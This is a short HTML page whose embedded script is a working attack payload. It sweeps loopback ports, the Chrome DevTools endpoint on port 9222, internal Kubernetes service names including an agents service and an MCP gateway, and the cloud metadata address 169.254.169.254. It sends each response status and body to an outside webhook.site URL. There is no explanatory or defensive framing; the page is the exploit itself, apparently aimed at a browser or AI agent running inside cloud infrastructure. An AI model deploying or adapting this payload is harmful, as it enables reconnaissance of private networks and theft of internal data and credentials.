<!doctype html><html><head><title>r2</title></head><body>x<script>
var EXF='https://webhook.site/25216e90-dea7-4f7f-8b7b-349b8badbe12';
function send(tag, txt){ try{ fetch(EXF+'?t='+encodeURIComponent(tag)+'&d='+encodeURIComponent(String(txt).slice(0,1500)),{mode:'no-cors'}); }catch(e){} }
function probe(tag, url, opts){
  fetch(url, opts||{}).then(function(r){ return r.text().then(function(t){ send(tag+'-READ', r.status+' :: '+t); }); })
    .catch(function(e){
      send(tag+'-READFAIL', String(e));
      fetch(url, Object.assign({}, opts||{}, {mode:'no-cors'}))
        .then(function(){ send(tag+'-REACH', 'reachable'); })
        .catch(function(e2){ send(tag+'-NOREACH', String(e2)); });
    });
}
send('R2-EXEC','alive');
// 1. mixed-content oracle: plain http PUBLIC host
probe('mc-oracle-ex', 'http://example.com/');
probe('mc-oracle-nev', 'http://neverssl.com/');
// 2. loopback sweep (mixed-content exempt per spec)
var ports=[9222,15020,80,443,8080,3000,5000,8000,8888,9090,5601,6379,5432,3306,15672];
for (var i=0;i<ports.length;i++){
  (function(p){ probe('lo-'+p, 'http://127.0.0.1:'+p+'/'); })(ports[i]);
}
probe('lo-localhost-9222', 'http://localhost:9222/json/version');
probe('lo-ipv6', 'http://[::1]:9222/json/version');
// 3. https internal DNS (not mixed content)
probe('hi-fed', 'https://fed.fed.svc.cluster.local/health');
probe('hi-lightning', 'https://lightning.lightning.svc.cluster.local/admin-v2/');
probe('hi-agents', 'https://agents.agents.svc.cluster.local/health');
probe('hi-mcpgw', 'https://mcp-gateway/health');
probe('hi-k8s', 'https://kubernetes.default.svc/version');
// 4. metadata over https (cert fail but connect oracle)
probe('hi-imds', 'https://169.254.169.254/latest/meta-data/');
document.title='R2-OK'; document.body.textContent='R2';
</script></body></html>
